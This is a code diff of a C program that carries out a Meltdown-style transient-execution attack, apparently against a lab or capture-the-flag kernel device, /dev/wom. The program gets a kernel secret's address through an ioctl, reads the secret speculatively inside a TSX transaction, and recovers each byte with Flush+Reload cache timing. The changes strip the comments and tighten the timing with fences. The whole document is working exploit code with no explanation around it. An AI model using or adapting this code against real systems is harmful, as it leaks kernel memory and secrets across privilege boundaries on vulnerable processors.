@@ -18,65 +18,62 @@
 
 #include "asm.h"
 
-// Probe array for Flush+Reload (256 pages to cover all byte values)
+#define SECRET_LENGTH 32
+#define WOM_MAGIC_NUM 0x1337
+#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)
+
 static uint8_t probe_array[256 * 4096];
-static volatile uint8_t dummy;  // Used to prevent compiler optimizations
+static volatile uint8_t dummy;
 
 int main() {
     int fd = open("/dev/wom", O_RDONLY);
-    if (fd < 0) {
-        perror("open");
-        return 1;
-    }
-    unsigned long secret_addr;
-    if (ioctl(fd, 0x1234, &secret_addr) != 0) {  // 0x1234: IOCTL code to get secret address
-        perror("ioctl");
-        return 1;
-    }
-    printf("Leaking 32-byte secret at address 0x%lx\n", secret_addr);
+    if (fd < 0) { perror("open"); return 1; }
+
+    unsigned long secret_addr = 0;
+    if (ioctl(fd, WOM_GET_ADDRESS, &secret_addr) < 0) { perror("ioctl"); return 1; }
+
+    for (int i = 0; i < 256; ++i) probe_array[i * 4096] = 1;
+
+    char warm[SECRET_LENGTH];
+    lseek(fd, 0, SEEK_SET);
+    size_t r = read(fd, warm, SECRET_LENGTH);
+    (void)r;
 
     char leaked[33] = {0};
     for (int offset = 0; offset < 32; ++offset) {
-        // 1. Flush probe array from cache
-        for (int i = 0; i < 256; ++i) {
-            _mm_clflush(&probe_array[i * 4096]);
-        }
+        for (int i = 0; i < 256; ++i) clflush(&probe_array[i * 4096]);
+        lfence(); cpuid();
 
-        // 2. Speculatively read the secret byte in a TSX transaction
         if (_xbegin() == _XBEGIN_STARTED) {
-            uint8_t value = *(uint8_t *)(secret_addr + offset);   // illegal kernel read (transient)
-            dummy = probe_array[value * 4096];  // cache based on secret value
+            uint8_t value = *(volatile uint8_t *)(secret_addr + offset);
+            dummy = probe_array[value * 4096];
             _xend();
         }
-        // Transaction aborts here if illegal access, but cache is affected
 
-        // 3. Reload: Time memory accesses to find which index is cached
         int best_index = -1;
         uint64_t best_time = (uint64_t)-1;
         for (int i = 0; i < 256; ++i) {
-            int mix_i = (i + 109883 * 256) & 255;  // Permuted index
+            int mix_i = (i + 109883 * 256) & 255;
             uint8_t *addr = &probe_array[mix_i * 4096];
-            // Measure access time for this index
+            lfence();
+            cpuid();
             uint64_t start = rdtscp();
-            (void)*addr;               // Access the address
+            (void)*addr;
             uint64_t end = rdtscp();
+            cpuid();
             uint64_t dt = end - start;
-            if (dt < best_time) {
-                best_time = dt;
-                best_index = mix_i;
-            }
+            if (dt < best_time) { best_time = dt; best_index = mix_i; }
         }
         leaked[offset] = (char)best_index;
     }
 
     printf("Leaked secret: ");
-    // Print leaked bytes (printable chars or hex values)
     for (int i = 0; i < 32; ++i) {
         unsigned char c = leaked[i];
         if (c >= 32 && c < 127) putchar(c);
         else printf("\\x%02x", c);
     }
-    putchar('\\n');
+    putchar('\n');
 
     close(fd);
     return 0;
